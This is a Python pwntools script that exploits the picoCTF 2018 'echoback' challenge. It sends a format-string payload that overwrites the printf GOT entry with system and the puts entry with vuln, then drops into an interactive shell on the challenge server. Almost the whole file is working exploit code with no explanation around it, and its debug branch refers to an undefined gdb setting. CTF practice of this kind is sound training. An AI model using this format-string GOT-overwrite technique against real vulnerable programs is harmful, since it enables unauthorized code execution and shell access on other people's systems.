#! /usr/bin/env python
import sys
#
from pwn import context, p32, u32, log, process, remote, args
from pwn import ELF, fmtstr_payload
context.clear(arch='i386', os='linux')


class ExploitInfo:
    host        = '2018shell2.picoctf.com'
    port        = 37402
    name        = 'echoback'
    elf         = ELF(name)
    fmt_offset  = 7


def get_process():
    r = None
    if args.REMOTE:
        r = remote(ExploitInfo.host, ExploitInfo.port)
    else:
        r = process('./%s' % ExploitInfo.name)
        if args.GDB:
            gdb.attach(r.pid, ExploitInfo.gdb)

    return r


def main():
    e = ExploitInfo.elf
    writes = {
        e.got['printf']   : e.symbols['system'],
        e.got['puts']     : e.symbols['vuln'],
    }

    log.info("Trying to write:")
    for x in writes:
        log.indented("0x%08x : 0x%08x", x, writes[x])

    payload = fmtstr_payload(ExploitInfo.fmt_offset, writes, write_size='short')
    p = get_process()

    p.clean()
    p.sendline(payload)
    log.success('Here\'re your shell!')
    p.clean(timeout = 1)
    p.sendline('ls -la')
    p.interactive()


if __name__ == "__main__":
    main()
